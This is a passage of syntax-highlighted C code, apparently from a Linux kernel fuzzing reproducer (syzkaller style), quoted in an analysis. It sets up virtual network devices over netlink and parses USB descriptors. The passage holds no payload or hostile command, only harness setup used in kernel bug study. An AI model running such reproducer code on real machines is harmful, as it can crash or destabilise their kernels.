<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">inet_pton</span><span class="p">(</span><span class="n">AF_INET6</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;fc00::01&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">geneve_addr6</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span>
<span class="w">    </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_add_geneve</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;geneve0&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">geneve_addr4</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_add_geneve</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;geneve1&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">geneve_addr6</span><span class="p">);</span>
<span class="w">  </span><span class="n">netdevsim_add</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">procid</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_wireguard_setup</span><span class="p">();</span>
<span class="w">  </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">devices</span><span class="p">)</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">devices</span><span class="p">[</span><span class="mi">0</span><span class="p">]));</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">addr</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
<span class="w">    </span><span class="n">sprintf</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span><span class="w"> </span><span class="n">DEV_IPV4</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">10</span><span class="p">);</span>
<span class="w">    </span><span class="n">netlink_add_addr4</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="n">devices</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">addr</span><span class="p">);</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">devices</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">noipv6</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="n">sprintf</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span><span class="w"> </span><span class="n">DEV_IPV6</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">10</span><span class="p">);</span>
<span class="w">      </span><span class="n">netlink_add_addr6</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="n">devices</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">addr</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">macaddr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DEV_MAC</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">((</span><span class="n">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">10ull</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="mi">40</span><span class="p">);</span>
<span class="w">    </span><span class="n">netlink_device_change</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="n">devices</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="nb">true</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">macaddr</span><span class="p">,</span>
<span class="w">                          </span><span class="n">devices</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">macsize</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="n">close</span><span class="p">(</span><span class="n">sock</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// 初始化一些特殊的网络设备</span>
<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">initialize_netdevices_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">sock</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">socket</span><span class="p">(</span><span class="n">AF_NETLINK</span><span class="p">,</span><span class="w"> </span><span class="n">SOCK_RAW</span><span class="p">,</span><span class="w"> </span><span class="n">NETLINK_ROUTE</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">sock</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">-1</span><span class="p">)</span>
<span class="w">    </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">type</span><span class="p">;</span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">macsize</span><span class="p">;</span>
<span class="w">    </span><span class="kt">bool</span><span class="w"> </span><span class="n">noipv6</span><span class="p">;</span>
<span class="w">    </span><span class="kt">bool</span><span class="w"> </span><span class="n">noup</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="n">devtypes</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;nr&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">7</span><span class="p">,</span><span class="w"> </span><span class="nb">true</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;rose&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">5</span><span class="p">,</span><span class="w"> </span><span class="nb">true</span><span class="p">,</span><span class="w"> </span><span class="nb">true</span><span class="p">},</span>
<span class="w">  </span><span class="p">};</span>
<span class="w">  </span><span class="kt">unsigned</span><span class="w"> </span><span class="n">i</span><span class="p">;</span>
<span class="w">  </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">devtypes</span><span class="p">)</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">devtypes</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">dev</span><span class="p">[</span><span class="mi">32</span><span class="p">],</span><span class="w"> </span><span class="n">addr</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
<span class="w">    </span><span class="n">sprintf</span><span class="p">(</span><span class="n">dev</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;%s%d&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">devtypes</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">type</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">procid</span><span class="p">);</span>
<span class="w">    </span><span class="n">sprintf</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;172.30.%d.%d&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">procid</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
<span class="w">    </span><span class="n">netlink_add_addr4</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="n">dev</span><span class="p">,</span><span class="w"> </span><span class="n">addr</span><span class="p">);</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">devtypes</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">noipv6</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="n">sprintf</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;fe88::%02x:%02x&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">procid</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
<span class="w">      </span><span class="n">netlink_add_addr6</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="n">dev</span><span class="p">,</span><span class="w"> </span><span class="n">addr</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">macsize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">devtypes</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">macsize</span><span class="p">;</span>
<span class="w">    </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">macaddr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xbbbbbb</span><span class="w"> </span><span class="o">+</span>
<span class="w">                       </span><span class="p">((</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="n">i</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="p">(</span><span class="mi">8</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="p">(</span><span class="n">macsize</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">2</span><span class="p">)))</span><span class="w"> </span><span class="o">+</span>
<span class="w">                       </span><span class="p">(</span><span class="n">procid</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="p">(</span><span class="mi">8</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="p">(</span><span class="n">macsize</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">)));</span>
<span class="w">    </span><span class="n">netlink_device_change</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="n">dev</span><span class="p">,</span><span class="w"> </span><span class="o">!</span><span class="n">devtypes</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">noup</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">macaddr</span><span class="p">,</span>
<span class="w">                          </span><span class="n">macsize</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="n">close</span><span class="p">(</span><span class="n">sock</span><span class="p">);</span>
<span class="p">}</span>

<span class="cp">#define MAX_FDS 30</span>

<span class="cp">#define USB_MAX_IFACE_NUM 4</span>
<span class="cp">#define USB_MAX_EP_NUM 32</span>
<span class="cp">#define USB_MAX_FDS 6</span>

<span class="k">struct</span><span class="w"> </span><span class="nc">usb_endpoint_index</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">usb_endpoint_descriptor</span><span class="w"> </span><span class="n">desc</span><span class="p">;</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">handle</span><span class="p">;</span>
<span class="p">};</span>

<span class="k">struct</span><span class="w"> </span><span class="nc">usb_iface_index</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">usb_interface_descriptor</span><span class="o">*</span><span class="w"> </span><span class="n">iface</span><span class="p">;</span>
<span class="w">  </span><span class="kt">uint8_t</span><span class="w"> </span><span class="n">bInterfaceNumber</span><span class="p">;</span>
<span class="w">  </span><span class="kt">uint8_t</span><span class="w"> </span><span class="n">bAlternateSetting</span><span class="p">;</span>
<span class="w">  </span><span class="kt">uint8_t</span><span class="w"> </span><span class="n">bInterfaceClass</span><span class="p">;</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">usb_endpoint_index</span><span class="w"> </span><span class="n">eps</span><span class="p">[</span><span class="n">USB_MAX_EP_NUM</span><span class="p">];</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">eps_num</span><span class="p">;</span>
<span class="p">};</span>

<span class="k">struct</span><span class="w"> </span><span class="nc">usb_device_index</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">usb_device_descriptor</span><span class="o">*</span><span class="w"> </span><span class="n">dev</span><span class="p">;</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">usb_config_descriptor</span><span class="o">*</span><span class="w"> </span><span class="n">config</span><span class="p">;</span>
<span class="w">  </span><span class="kt">uint8_t</span><span class="w"> </span><span class="n">bDeviceClass</span><span class="p">;</span>
<span class="w">  </span><span class="kt">uint8_t</span><span class="w"> </span><span class="n">bMaxPower</span><span class="p">;</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">config_length</span><span class="p">;</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">usb_iface_index</span><span class="w"> </span><span class="n">ifaces</span><span class="p">[</span><span class="n">USB_MAX_IFACE_NUM</span><span class="p">];</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">ifaces_num</span><span class="p">;</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">iface_cur</span><span class="p">;</span>
<span class="p">};</span>

<span class="k">struct</span><span class="w"> </span><span class="nc">usb_info</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">;</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">usb_device_index</span><span class="w"> </span><span class="n">index</span><span class="p">;</span>
<span class="p">};</span>

<span class="k">static</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">usb_info</span><span class="w"> </span><span class="n">usb_devices</span><span class="p">[</span><span class="n">USB_MAX_FDS</span><span class="p">];</span>
<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">usb_devices_num</span><span class="p">;</span>

<span class="k">static</span><span class="w"> </span><span class="kt">bool</span><span class="w"> </span><span class="nf">parse_usb_descriptor</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">length</span><span class="p">,</span>
<span class="w">                                 </span><span class="k">struct</span><span class="w"> </span><span class="nc">usb_device_index</span><span class="o">*</span><span class="w"> </span><span class="n">index</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">length</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">index</span><span class="o">-&gt;</span><span class="n">dev</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">index</span><span class="o">-&gt;</span><span class="n">config</span><span class="p">))</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">false</span><span class="p">;</span>
<span class="w">  </span><span class="n">memset</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">index</span><span class="p">));</span>
<span class="w">  </span><span class="n">index</span><span class="o">-&gt;</span><span class="n">dev</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">usb_device_descriptor</span><span class="o">*</span><span class="p">)</span><span class="n">buffer</span><span class="p">;</span>
<span class="w">  </span><span class="n">index</span><span class="o">-&gt;</span><span class="n">config</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">usb_config_descriptor</span><span class="o">*</span><span class="p">)(</span><span class="n">buffer</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">index</span><span class="o">-&gt;</span><span class="n">dev</span><span class="p">));</span>
<span class="w">  </span><span class="n">index</span><span class="o">-&gt;</span><span class="n">bDeviceClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">index</span><span class="o">-&gt;</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">bDeviceClass</span><span class="p">;</span>
<span class="w">  </span><span class="n">index</span><span class="o">-&gt;</span><span class="n">bMaxPower</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">index</span><span class="o">-&gt;</span><span class="n">config</span><span class="o">-&gt;</span><span class="n">bMaxPower</span><span class="p">;</span>
<span class="w">  </span><span class="n">index</span><span class="o">-&gt;</span><span class="n">config_length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">length</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">index</span><span class="o">-&gt;</span><span class="n">dev</span><span class="p">);</span>
<span class="w">  </span><span class="n">index</span><span class="o">-&gt;</span><span class="n">iface_cur</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
<span class="w">  </span><span class="kt">size_t</span><span class="w"> </span><span class="n">offset</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">  </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="nb">true</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">offset</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">length</span><span class="p">)</span>
<span class="w">      </span><span class="k">break</span><span class="p">;</span>
<span class="w">    </span><span class="kt">uint8_t</span><span class="w"> </span><span class="n">desc_length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="n">offset</span><span class="p">];</span>
<span class="w">    </span><span class="kt">uint8_t</span><span class="w"> </span><span class="n">desc_type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="n">offset</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">];</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">desc_length</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span>
<span class="w">      </span><span class="k">break</span><span class="p">;</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">offset</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">desc_length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">length</span><span class="p">)</span>
<span class="w">      </span><span class="k">break</span><span class="p">;</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">desc_type</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">USB_DT_INTERFACE</span><span class="w"> </span><span class="o">&amp;&amp;</span>
<span class="w">        </span><span class="n">index</span><span class="o">-&gt;</span><span class="n">ifaces_num</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">USB_MAX_IFACE_NUM</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="k">struct</span><span class="w"> </span><span class="nc">usb_interface_descriptor</span><span class="o">*</span><span class="w"> </span><span class="n">iface</span><span class="w"> </span><span class="o">=</span>
<span class="w">          </span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">usb_interface_descriptor</span><span class="o">*</span><span class="p">)(</span><span class="n">buffer</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">offset</span><span class="p">);</span>
<span class="w">      </span><span class="n">index</span><span class="o">-&gt;</span><span class="n">ifaces</span><span class="p">[</span><span class="n">index</span><span class="o">-&gt;</span><span class="n">ifaces_num</span><span class="p">].</span><span class="n">iface</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">iface</span><span class="p">;</span>
<span class="w">      </span><span class="n">index</span><span class="o">-&gt;</span><span class="n">ifaces</span><span class="p">[</span><span class="n">index</span><span class="o">-&gt;</span><span class="n">ifaces_num</span><span class="p">].</span><span class="n">bInterfaceNumber</span><span class="w"> </span><span class="o">=</span>
<span class="w">          </span><span class="n">iface</span><span class="o">-&gt;</span><span class="n">bInterfaceNumber</span><span class="p">;</span>
<span class="w">      </span><span class="n">index</span><span class="o">-&gt;</span><span class="n">ifaces</span><span class="p">[</span><span class="n">index</span><span class="o">-&gt;</span><span class="n">ifaces_num</span><span class="p">].</span><span class="n">bAlternateSetting</span><span class="w"> </span><span class="o">=</span>
<span class="w">          </span><span class="n">iface</span><span class="o">-&gt;</span><span class="n">bAlternateSetting</span><span class="p">;</span>
<span class="w">      </span><span class="n">index</span><span class="o">-&gt;</span><span class="n">ifaces</span><span class="p">[</span><span class="n">index</span><span class="o">-&gt;</span><span class="n">ifaces_num</span><span class="p">].</span><span class="n">bInterfaceClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">iface</span><span class="o">-&gt;</span><span class="n">bInterfaceClass</span><span class="p">;</span>
<span class="w">      </span><span class="n">index</span><span class="o">-&gt;</span><span class="n">ifaces_num</span><span class="o">++</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">desc_type</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">USB_DT_ENDPOINT</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">index</span><span class="o">-&gt;</span><span class="n">ifaces_num</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="k">struct</span><span class="w"> </span><span class="nc">usb_iface_index</span><span class="o">*</span><span class="w"> </span><span class="n">iface</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">index</span><span class="o">-&gt;</span><span class="n">ifaces</span><span class="p">[</span><span class="n">index</span><span class="o">-&gt;</span><span class="n">ifaces_num</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">];</span>
<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">iface</span><span class="o">-&gt;</span><span class="n">eps_num</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">USB_MAX_EP_NUM</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">iface</span><span class="o">-&gt;</span><span class="n">eps</span><span class="p">[</span><span class="n">iface</span><span class="o">-&gt;</span><span class="n">eps_num</span><span class="p">].</span><span class="n">desc</span><span class="p">,</span><span class="w"> </span><span class="n">buffer</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">offset</span><span class="p">,</span>
<span class="w">               </span><span class="k">sizeof</span><span class="p">(</span><span class="n">iface</span><span class="o">-&gt;</span><span class="n">eps</span><span class="p">[</span><span class="n">iface</span><span class="o">-&gt;</span><span class="n">eps_num</span><span class="p">].</span><span class="n">desc</span><span class="p">));</span>
<span class="w">        </span><span class="n">iface</span><span class="o">-&gt;</span><span class="n">eps_num</span><span class="o">++</span><span class="p">;</span>
<span class="w">      </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="n">offset</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">desc_length</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nb">true</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">usb_device_index</span><span class="o">*</span><span class="w"> </span><span class="n">add_usb_index</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">dev</span><span class="p">,</span>
<span class="w">                                              </span><span class="kt">size_t</span><span class="w"> </span><span class="n">dev_len</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">__atomic_fetch_add</span><span class="p">(</span><span class="o">&amp;</span><span class="n">usb_devices_num</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">__ATOMIC_RELAXED</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">USB_MAX_FDS</span><span class="p">)</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">parse_usb_descriptor</span><span class="p">(</span><span class="n">dev</span><span class="p">,</span><span class="w"> </span><span class="n">dev_len</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">usb_devices</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">index</span><span class="p">))</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
<span class="w">  </span><span class="n">__atomic_store_n</span><span class="p">(</span><span class="o">&amp;</span><span class="n">usb_devices</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">__ATOMIC_RELEASE</span><span class="p">);</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="o">&amp;</span><span class="n">usb_devices</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">index</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">usb_device_index</span><span class="o">*</span><span class="w"> </span><span class="n">lookup_usb_index</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">USB_MAX_FDS</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
